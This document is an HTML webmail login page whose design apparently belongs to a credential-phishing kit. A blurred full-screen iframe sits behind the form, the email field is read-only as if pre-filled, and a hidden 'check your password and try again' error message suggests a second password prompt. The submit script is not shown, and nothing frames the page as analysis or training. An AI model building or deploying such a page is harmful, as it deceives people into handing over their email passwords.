<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title id="title">Webmail Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #fff;
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    #domainFrame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: -1;
      pointer-events: none;
      filter: blur(2px) brightness(0.3);
    }
    #forms {
      width: 100%;
      max-width: 380px;
      padding: 40px 30px;
      box-sizing: border-box;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      border-radius: 6px;
      background-color: rgba(255, 255, 255, 0.92);
      position: relative;
      z-index: 2;
    }

    .logo {
      font-size: 40px;
      font-weight: bold;
      color: #f46a1c;
      margin-bottom: 30px;
      text-align: center;
      font-family: Arial, sans-serif;
    }

    label {
      font-weight: bold;
      font-size: 14px;
      display: block;
      margin-bottom: 5px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #007cba;
      color: #fff;
      border: none;
      font-size: 15px;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background: #005e96;
    }

    #error-msg {
      color: red;
      text-align: center;
      margin-bottom: 15px;
      display: none;
    }

    .footer-lang {
      position: fixed;
      bottom: 15px;
      font-size: 13px;
      color: #333;
      text-align: center;
      width: 100%;
    }

    .footer-lang span {
      margin: 0 5px;
      cursor: default;
    }
  </style>
</head>
<body>
  <iframe id="domainFrame"></iframe>
  <div class="logo" id="title">Webmail</div>

  <div id="forms">
    <form id="login_form" onsubmit="handleSubmit(event)">
      <div class="input-group">
        <label for="user">Email Address</label>
        <input type="email" id="user" name="user" placeholder="Enter your email address." required readonly>
      </div>

      <div class="input-group">
        <label for="pass">Password</label>
        <input type="password" id="pass" name="pass" placeholder="Enter your email password." required>
      </div>

      <div id="error-msg">Error. Please check your password and try again.</div>

      <button type="submit" id="submitBtn">Log in</button>
    </form>
  </div>

  <div class="footer-lang">
    <span>العربية</span><span>čeština</span><span>dansk</span><span>Deutsch</span>
    <span>Ελληνικά</span><span>español</span><span>français</span>
    <span>日本語</span><span>ภาษาไทย</span><span>...</span>
  </div>
